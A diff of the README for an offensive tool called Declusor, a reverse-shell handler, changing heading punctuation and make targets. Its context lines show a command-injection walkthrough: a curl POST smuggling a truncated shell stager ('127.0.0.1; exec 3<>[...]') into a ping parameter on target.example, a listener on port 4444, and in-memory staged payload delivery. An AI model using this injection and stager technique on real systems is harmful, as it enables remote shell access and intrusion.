@@ -171,13 +171,13 @@ Content-Type: application/json
 {"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
 ```
 
-**1. Start Declusor locally on your interface (e.g. copying launcher to clipboard):**
+**1. Start Declusor locally on your interface (e.g. copying launcher to clipboard)**
 
 ```bash
 declusor 127.0.0.1 4444 --plugin shell_socket -O clipboard
 ```
 
-**2. Inject the ~85-character one-liner directly into the vulnerable parameter:**
+**2. Inject the ~85-character one-liner directly into the vulnerable parameter**
 
 ```bash
 # Inject the compact stager directly via curl
@@ -185,7 +185,7 @@ curl -s -X POST https://target.example/api/diagnostics/ping \
     -H "Content-Type: application/json" -d '{"ip": "127.0.0.1; exec 3<>[...]"}'
 ```
 
-**3. Upon connection, Declusor immediately transmits the Stage 1 client payload over the same established socket descriptor (FD 3). The client evaluates it in-memory, negotiates the framed session handshake, and opens the interactive REPL:**
+**3. Upon connection, Declusor immediately transmits the Stage 1 client payload over the same established socket descriptor (FD 3). The client evaluates it in-memory, negotiates the framed session handshake, and opens the interactive REPL**
 
 ```console
 [declusor]
@@ -234,7 +234,7 @@ Clone the repository, create its virtual environment, and install the CLI and bu
 git clone https://github.com/othonhugo/declusor.git
 cd declusor
 uv sync --no-default-groups
-make install-plugins
+make install TARGET=plugins
 .venv/bin/declusor 127.0.0.1 4444
 ```
 
@@ -249,7 +249,7 @@ python3 -m venv .venv && source .venv/bin/activate
 
 # Install the CLI from the checkout and link its built-in plugins
 python -m pip install -e .
-make install-plugins
+make install TARGET=plugins
 
 # Start the CLI
 declusor 127.0.0.1 4444
@@ -298,7 +298,7 @@ Declusor adheres to strict **Clean Architecture** and **Dependency Inversion** p
 - **Fail-Fast Invariants**: Immutable Command DTOs validate parameters at the boundary, preventing invalid operations from propagating into transports.
 - **Deterministic Flow Control**: Controllers return explicit lifecycle signals (`CONTINUE`, `TERMINATE`) rather than relying on control-flow exceptions.
 - **Deterministic Test Boundaries**: Component tests use in-memory doubles; focused socket-adapter and native-client workflows use loopback connections with deterministic teardown.
-- **Memory-Isolated Verification**: Unit, application E2E, and plugin suites run in isolated processes via `make test-unit`, `make test-e2e`, and `make test-plugins`, under the configured Mypy strict profile.
+- **Memory-Isolated Verification**: Unit, application E2E, and plugin suites run in isolated processes via `make test TARGET=declusor` and `make test TARGET=plugins`, under the configured Mypy strict profile.
 
 Read the complete architectural specification in [ARCHITECTURE.md](ARCHITECTURE.md).
 
@@ -309,7 +309,7 @@ Contributions from both humans and autonomous agents are warmly welcomed! Please
 All contributions must pass the verification gate with zero warnings or errors:
 
 ```bash
-make check  # Runs format-check, lint, configured Mypy strict analysis, and all memory-isolated test suites
+make check  # Runs formatting, lint, configured Mypy strict analysis, compilation, and tests
 ```
 
 ## License
